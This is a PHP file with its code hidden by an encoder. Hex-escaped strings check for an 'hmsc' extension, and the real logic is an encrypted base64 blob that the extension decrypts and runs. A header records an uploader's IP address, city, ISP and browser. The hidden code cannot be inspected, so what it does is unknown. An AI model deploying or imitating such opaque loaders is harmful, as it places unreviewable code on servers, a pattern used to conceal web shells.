<?php 
/***
Date		:	2024-12-26 16:51:52
Ipaddress		:	114.5.111.68
City		:	Surabaya
Country		:	ID
Region		:	East Java
Organization		:	AS4761 INDOSAT Internet Network Provider
User-Agent		:	Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36
***/
if(!function_exists("\113\x5a\x6f\x68\x67\141\160")){function KZohgap(){$HSnx3ovz="\x68\x74\164\160\x73\x3a\x2f\x2f\147\151\x74\150\165\142\x2e\143\157\x6d\x2f\105\144\144\x69\x65\113\151\x64\151\x77\x2f\110\115\123\x43";return("\x48\x6d\x73\x63\40\x65\x78\x74\x65\x6e\x73\151\157\156\x20\x6e\157\x74\40\146\x6f\165\156\144\x2e".PHP_EOL."\110\x6f\167\x20\164\157\x20\151\156\163\164\x61\x6c\154\40\150\x6d\x73\143\x20\145\x78\164\x65\156\x73\151\x6f\x6e\40\166\151\163\151\164\40".((php_sapi_name()=="\143\x6c\x69")?$HSnx3ovz:"\x3c\141\40\x68\162\x65\146\75\x22".$HSnx3ovz."\x22\76\110\151\144\145\40\115\x79\40\123\157\x75\x72\x63\145\x20\x43\157\144\145\x3c\57\x61\76").PHP_EOL);}}if(extension_loaded("\x68\155\x73\x63")&&function_exists("\150\x6d\163\143")){$ckOFcx6PtC="\x68\155\163\143\137\x69\x6e\151\x74";$fX741ggGQA6="\150\x6d\x73\x63";return(hmsc_init('aMSZCHZD94vxUFtdWvK0OEduxbvDZXZtRaf2Yyr4qbfOKujKSfsSZEboyWBRaI90NGkMwt13Q/4=')?hmsc(''):!1);}else{print KZohgap();}exit;?>
wJLqM9yUJfsDZ8buOVSJ2n98BeG6oex84NoCA7Ir9CGcKBRFUk2EK7/mXUwmNGvy5wCCQcwKI5Nj
/coqXNMp8D8d1CLsHfLU/I3thtcLRlOSh/z32kPhW62+nQADuexGi5EHraSB+MdSgElgLrAYHijK
3btwcQvywGLGkKXt8+fc4KUfly1+LaHZtbx5zu/+nbRe7EH03QvIRJFuEG4bMwbSv9UP2mBsRCjx
k/XFNubtw5bhQuQe47GQ/mBwMnpZ5bWSq74d/lZ0T9WDAHGFl3JepTrd9ztJbHwtis/Xy9/Ujzz9
HzJjzKDnZuM8EMoqQG7ybYKagqgqhbUEtB/0QANtD4cW+ThzYaNer2b6NS5NhBmk90/VBkCfZ3jG
S6VTPZWOSwyfpy+OHtfnqrzGjoXV4c+gCtHwCTWxHliqBRJBaogjQqB+H9LL0We11L5AhnE8BTa/
5obyLeV+jbxSwNmhDcx/48mS0MAzWt45aOeLTRQFylyhRBCmEeWvt685UxhwIdWyZ5BWYl9/A1vo
nQYB3Ik8W5m2BYaDtL/f3lvWS6fZN25afI2owuEDTc6VzvB/Z8pS6UY+wbQAWeh1a6EPVbYrTfPn
yMeYt98cickCNXRxox72J2K6zN/m6m3ZvMqW/E641EC5Ex8P6Gb/oPv+EIJ8M3oXXjp7L03TT/hF
J81TkRFb7wBkmNtUW7sou1eX6OkteW/jcD8YbzTuoMfEOXwj458XAMkfPJ0eNYtwVkg8Yeaq4iiV
lANPxAKaoFpbeLkP7FELRJ+elkB3MTKpTiRW02c4OZIB1hq02D8qjHDhrunHwLwADRh6TFqXaDi5
BmEqddg5s7JfbWgPmb0875AA86SRk2FDGau675kmFLeBZi+qG/7AxtFMkSuFfERMU4o4Pd/dJUlW
2OCPxHwg9gaH9EwPoCom9WePNoCzZVv4vR85st7mTVug36ixpd1MLxPpQLoDs245Xj/mzgmH9UJF
WFUptOHHQBOrKCz9kOUo8e7eQ5hK/UYsxQ0RV43jUlv5/Q0C8gHaa0g7pf9/xvjURdShKfK82h3s
wJLqM9yUJfsDZ8buOVSJ2nhAeh8Sis5JtN+QS/DSZhzJdYJK
